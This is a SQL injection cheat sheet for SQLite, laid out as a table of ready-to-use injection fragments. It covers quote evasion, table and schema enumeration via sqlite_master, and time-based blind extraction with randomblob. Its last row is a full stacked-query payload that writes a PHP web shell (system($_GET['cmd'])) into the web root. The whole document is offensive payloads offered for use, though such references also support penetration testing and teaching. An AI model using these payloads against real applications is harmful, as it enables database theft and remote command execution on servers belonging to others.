# SQLite SQL Injection Cheat Sheet

|If you need                  |                                    You use                                      |
|-----------------------------|:-------------------------------------------------------------------------------:|
|Concatenation                |                                     \|\|                                        |
|Comments                     |                                      --                                         |
|Conditionals                 |  CASE WHEN key='value1' THEN 'something' WHEN key='value2' THEN 'somethingelse' |
|Substring                    |                          substr(string,start,stop)                              |
|Length                       |                              length(string)                                     |
|Quotes without literal quotes|              cast(X'27' as text)  *--use X'22' for double quotes*               |
|Table name enumeration       |               SELECT name FROM sqlite_master WHERE type='table'                 |
|Table schema enumeration     |                SELECT sql FROM sqlite_master WHERE type='table'                 |
|Time-based data extraction   |    cond='true' AND 1=randomblob(100000000) *--causes time delay if cond='true'* |
|File writing                 |1';ATTACH DATABASE ‘/var/www/lol.php’ AS lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn (dataz) VALUES (‘<? system($_GET[‘cmd’]); ?>’;-- *--requires either direct database access or (non-default) stacked query option enabled|


This work is based on http://atta.cked.me/home/sqlite3injectioncheatsheet
